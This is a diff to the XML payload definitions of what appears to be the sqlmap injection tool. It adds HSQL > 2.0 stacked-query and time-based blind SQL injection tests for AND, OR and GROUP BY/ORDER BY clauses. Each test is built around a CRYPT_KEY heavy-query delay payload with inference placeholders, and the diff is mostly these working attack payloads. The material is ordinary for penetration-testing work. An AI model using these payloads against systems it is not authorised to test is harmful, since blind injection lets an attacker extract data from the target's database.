@@ -1125,8 +1125,6 @@ Formats:
             <dbms>PostgreSQL</dbms>
         </details>
     </test>
-    <!-- End of stacked conditional-error blind queries tests -->
-
 
     <!-- Error-based tests - WHERE or HAVING clause -->
     <test>
@@ -1878,7 +1876,6 @@ Formats:
     -->
     <!-- End of error-based tests - GROUP BY and ORDER BY clauses -->
 
-
     <!-- Inline queries tests -->
     <test>
         <title>MySQL inline queries</title>
@@ -1994,8 +1991,8 @@ Formats:
             <dbms>Firebird</dbms>
         </details>
     </test>
-    <!-- End of inline queries tests -->
 
+    <!-- End of inline queries tests -->
 
     <!-- Stacked queries tests -->
     <test>
@@ -2243,6 +2240,27 @@ Formats:
         <details>
             <dbms>Firebird</dbms>
             <dbms_version>&gt;= 2.0</dbms_version>
+        </details>
+    </test>
+	
+    <test>
+        <title>HSQL &gt; 2.0 Server stacked queries</title>
+        <stype>4</stype>
+        <level>1</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>;VALUES CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) END</vector>
+        <request>
+            <payload>;VALUES REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQL</dbms>
+            <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access and SAP MaxDB -->
@@ -2712,6 +2730,47 @@ Formats:
             <dbms>IBM DB2</dbms>
         </details>
     </test>
+	
+    <test>
+        <title>HSQL &gt; 2.0 AND time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>AND '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQL</dbms>
+			<dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQL &gt; 2.0 AND time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>AND '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQL</dbms>
+			<dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
     <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of AND time-based blind tests -->
 
@@ -2929,6 +2988,47 @@ Formats:
         </response>
         <details>
             <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+	
+    <test>
+        <title>HSQL &gt; 2.0 OR time-based blind (heavy query)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>OR '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>HSQL</dbms>
+			<dbms_version>&gt; 2.0</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>HSQL &gt; 2.0 OR time-based blind (heavy query - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <request>
+            <payload>OR '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQL</dbms>
+			<dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access -->
@@ -3387,6 +3487,26 @@ Formats:
         </response>
         <details>
             <dbms>Oracle</dbms>
+        </details>
+    </test>
+	
+	<test>
+        <title>HSQL time-based blind - GROUP BY and ORDER BY clauses (heavy query)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>2</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+		<vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(VALUES 0) END) FROM (VALUES(0)))</vector>
+        <request>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>HSQL</dbms>
+			<dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access -->
